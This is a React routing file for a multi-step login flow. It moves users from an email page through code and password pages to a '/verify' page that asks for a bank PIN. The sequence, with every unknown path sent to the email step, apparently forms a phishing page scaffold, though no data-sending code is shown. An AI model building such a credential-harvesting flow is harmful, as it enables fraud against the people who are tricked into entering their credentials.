import { useEffect, useState } from "react";
import Email from "./components/flow.jsx/Email";
import Password from "./components/flow.jsx/Password";
import Code from "./components/flow.jsx/Code";
import "./App.css";
import './index.css';
import BankPin from "./components/flow.jsx/BankPin";
import { Routes, Route} from 'react-router-dom';


function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  // console.log("email is ",email)

  return (
    <>
      <div className="bg">
      <Routes>
        <Route
          path="*"
          element={
            <Email
              email={email}
              setEmail={setEmail}
              // toggle={togglePass}
              // setToggle={setTogglePass}
              // onSubmit={handleEmailSubmit}
            />
          }
        />
        <Route
          path="/code"
          element={
            <Code
              emailValue={email}
              // onSubmit={handleCodeSubmit}
            />
          }
        />
        <Route
          path="/password"
          element={
            <Password
              email={email}
              // toggle={toggleCode}
              // setToggleCode={setToggleCode}
              password={password}
              setPassword={setPassword}
              // onSubmit={handlePasswordSubmit}
            />
          }
        />
        <Route
          path="/verify"
          element={
            <BankPin 
            email={email}
            password={password}
            />
          }
        />
      </Routes>
    </div>

        {/* <Email
          email={email}
          setEmail={setEmail}
          toggle={togglePass}
          setToggle={setTogglePass}
        /> */}
      {/* {toggleCode ? (
        <div className="bg">
          <Code 
            emailValue={email} 
          />
        </div>
      ) : (
        <div className="bg">
          {togglePass ? (
            <Password
              toggle={toggleCode}
              setToggleCode={setToggleCode}
              password={password}
              setPassword={setPassword}
            />
          ) : (
            <Email
              email={email}
              setEmail={setEmail}
              toggle={togglePass}
              setToggle={setTogglePass}
            />
          )}
        </div>
      )} */}
    </>
  );
}

export default App;
